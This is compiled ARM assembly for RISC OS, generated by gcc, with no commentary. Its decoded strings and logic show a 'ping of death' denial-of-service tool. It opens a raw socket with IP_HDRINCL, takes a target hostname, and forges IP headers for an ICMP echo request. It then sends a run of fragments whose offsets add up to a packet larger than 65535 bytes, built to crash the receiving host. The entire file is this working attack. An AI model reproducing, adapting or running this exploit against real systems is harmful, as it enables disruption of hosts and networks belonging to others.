; Generated by gcc egcs-2.90.01 970821 (gcc2-970802 experimental) for ARM/RISC OS
__a1	RN	0
__a2	RN	1
__a3	RN	2
__a4	RN	3
__v1	RN	4
__v2	RN	5
__v3	RN	6
__v4	RN	7
__v5	RN	8
__v6	RN	9
__sl	RN	10
__fp	RN	11
__ip	RN	12
__sp	RN	13
__lr	RN	14
__pc	RN	15
__f0	FN	0
__f1	FN	1
__f2	FN	2
__f3	FN	3
__f4	FN	4
__f5	FN	5
__f6	FN	6
__f7	FN	7
	AREA |C$$code1|, CODE, READONLY
; GNU C version egcs-2.90.01 970821 (gcc2-970802 experimental) (arm-acorn-riscos) compiled by CC.
; options passed:  -O
; options enabled:  -fdefer-pop -fomit-frame-pointer -fthread-jumps
; -fpeephole -ffunction-cse -finline -fkeep-static-consts
; -freg-struct-return -fexceptions -fsjlj-exceptions -fcommon -fverbose-asm
; -fgnu-linker -falias-check -fargument-alias -mapcs -mapcs-frame
; -mpoke-function-name -mapcs-stack-check

|gcc2_compiled.|
	ALIGN
|LC..0|
	DCB &73, &6f, &63, &6b
	DCB &65, &74, &00
	ALIGN
|LC..1|
	DCB &49, &50, &5f, &48
	DCB &44, &52, &49, &4e
	DCB &43, &4c, &00
	ALIGN
|LC..2|
	DCB &75, &73, &61, &67
	DCB &65, &3a, &20, &25
	DCB &73, &20, &68, &6f
	DCB &73, &74, &6e, &61
	DCB &6d, &65, &0a, &00
	ALIGN
|LC..3|
	DCB &25, &73, &3a, &20
	DCB &75, &6e, &6b, &6e
	DCB &6f, &77, &6e, &20
	DCB &68, &6f, &73, &74
	DCB &0a, &00
	ALIGN
|LC..4|
	DCB &53, &65, &6e, &64
	DCB &69, &6e, &67, &20
	DCB &74, &6f, &20, &25
	DCB &73, &0a, &00
	ALIGN
|LC..5|
	DCB &6f, &66, &66, &73
	DCB &65, &74, &20, &25
	DCB &64, &3a, &20, &00
	ALIGN
|LC..6|
	DCB &73, &65, &6e, &64
	DCB &74, &6f, &00
	ALIGN
	EXPORT	|main|
	DCB &6d, &61, &69, &6e
	DCB &00
	ALIGN
	DCD	-16777208
|main|
	; args = 0, pretend = 0, frame = 1528
	; frame_needed = 1, current_function_anonymous_args = 0
	mov	__ip, __sp
	stmfd	__sp!, {__v1, __v2, __v3, __v4, __v5, __v6, __fp, __ip, __lr, __pc}
	sub	__fp, __ip, #4
	sub	__ip, __sp, #1520
	cmp	__ip, __sl
	bllt	|x$stack_overflow_1|
	sub	__sp, __sp, #504
	sub	__sp, __sp, #1024
	mov	__v5, __a1
	mov	__v1, __a2
	bl	|__gccmain|
	add	__v2, __sp, #8
	add	__v3, __sp, #28
	mov	__v4, #1
	str	__v4, [__sp, #1524]
	mov	__a1, __v2
	ldr	__a2, |L..17|
	bl	|bzero|
	mov	__a1, #2
	mov	__a2, #3
	mov	__a3, #0
	bl	|socket|
	subs	__v6, __a1, #0
	ldrlt	__a1, |L..17|+4
	bllt	|perror|
	movlt	__a1, __v4
	bllt	|exit|
|L..2|
	mov	__a4, #4
	str	__a4, [__sp, #0]
	mov	__a1, __v6
	mov	__a2, #0
	mov	__a3, #2
	add	__a4, __sp, #1520
	add	__a4, __a4, #4
	bl	|setsockopt|
	cmp	__a1, #0
	ldrlt	__a1, |L..17|+8
	bllt	|perror|
	movlt	__a1, #1
	bllt	|exit|
|L..3|
	cmp	__v5, #2
	beq	|L..4|
	ldr	__a4, |L..17|+12
	ldr	__a1, [__a4, #0]
	ldr	__a2, |L..17|+16
	ldr	__a3, [__v1, #0]
	bl	|fprintf|
	mov	__a1, #1
	bl	|exit|
|L..4|
	ldr	__a1, [__v1, #4]
	bl	|gethostbyname|
	subs	__a3, __a1, #0
	bne	|L..5|
	ldr	__a1, [__v1, #4]
	bl	|inet_addr|
	str	__a1, [__v2, #16]
	cmn	__a1, #1
	bne	|L..7|
	ldr	__a4, |L..17|+12
	ldr	__a1, [__a4, #0]
	ldr	__a2, |L..17|+20
	ldr	__a3, [__v1, #4]
	bl	|fprintf|
	mov	__a1, #1
	bl	|exit|
|L..5|
	ldr	__a4, [__a3, #16]
	ldr	__a1, [__a4, #0]
	add	__a2, __v2, #16
	ldr	__a3, [__a3, #12]
	bl	|bcopy|
|L..7|
	ldr	__a1, [__v2, #16]
	bl	|inet_ntoa|
	mov	__a2, __a1
	ldr	__a1, |L..17|+24
	bl	|printf|
	mov	__a4, #69
	strb	__a4, [__v2, #0]
	mov	__v1, #0
	strb	__v1, [__v2, #1]
	mov	__a4, #220
	mov	__a3, #5
	strb	__a4, [__v2, #2]
	strb	__a3, [__v2, #3]
	ldr	__a1, |L..17|+28
	bl	|htons|
	strb	__a1, [__v2, #4]
	mov	__a1, __a1, asr #8
	strb	__a1, [__v2, #5]
	strb	__v1, [__v2, #6]
	strb	__v1, [__v2, #7]
	mov	__a4, #255
	strb	__a4, [__v2, #8]
	mov	__a4, #1
	strb	__a4, [__v2, #9]
	strb	__v1, [__v2, #10]
	strb	__v1, [__v2, #11]
	str	__v1, [__v2, #12]
	ldr	__a4, [__v2, #16]
	str	__a4, [__sp, #1512]
	mov	__a4, #2
	strb	__a4, [__sp, #1508]
	strb	__v1, [__sp, #1509]
	mov	__a4, #8
	strb	__a4, [__v3, #0]
	strb	__v1, [__v3, #1]
	ldr	__a1, |L..17|+32
	bl	|htons|
	strb	__a1, [__v3, #2]
	mov	__a1, __a1, asr #8
	strb	__a1, [__v3, #3]
	ldr	__v5, |L..17|
	add	__v4, __sp, #8
|L..11|
	mov	__a4, __v1, asr #3
	strb	__a4, [__v2, #6]
	mov	__a4, __v1, asr #11
	strb	__a4, [__v2, #7]
	ldr	__a4, |L..17|+36
	cmp	__v1, __a4
	bgt	|L..12|
	ldr	__a4, [__v2, #6]	; movhi
	orr	__a4, __a4, #8192
	strb	__a4, [__v2, #6]
	mov	__a4, __a4, asr #8
	strb	__a4, [__v2, #7]
	b	|L..13|
|L..12|
	mov	__a4, #162
	mov	__a3, #1
	strb	__a4, [__v2, #2]
	strb	__a3, [__v2, #3]
|L..13|
	add	__a4, __v4, __v5
	str	__a4, [__sp, #0]
	mov	__a4, #16
	str	__a4, [__sp, #4]
	mov	__a1, __v6
	mov	__a2, __v4
	mov	__a3, __v5
	mov	__a4, #0
	bl	|sendto|
	cmp	__a1, #0
	bge	|L..14|
	ldr	__a4, |L..17|+12
	ldr	__a1, [__a4, #0]
	ldr	__a2, |L..17|+40
	mov	__a3, __v1
	bl	|fprintf|
	ldr	__a1, |L..17|+44
	bl	|perror|
|L..14|
	cmp	__v1, #0
	streqb	__v1, [__v3, #0]
	streqb	__v1, [__v3, #1]
	streqb	__v1, [__v3, #2]
	streqb	__v1, [__v3, #3]
|L..10|
	add	__v1, __v1, #1472
	add	__v1, __v1, #8
	ldr	__a4, |L..17|+48
	cmp	__v1, __a4
	ble	|L..11|
	mov	__a1, #0
	ldmea	__fp, {__v1, __v2, __v3, __v4, __v5, __v6, __fp, __sp, __pc}^
|L..18|
	ALIGN
|L..17|
	DCD	1500
	DCD	|LC..0|
	DCD	|LC..1|
	DCD	|__stderr|
	DCD	|LC..2|
	DCD	|LC..3|
	DCD	|LC..4|
	DCD	4321
	DCD	63487
	DCD	65119
	DCD	|LC..5|
	DCD	|LC..6|
	DCD	65535
	IMPORT	|__main|
	DCD	|__main|
	END
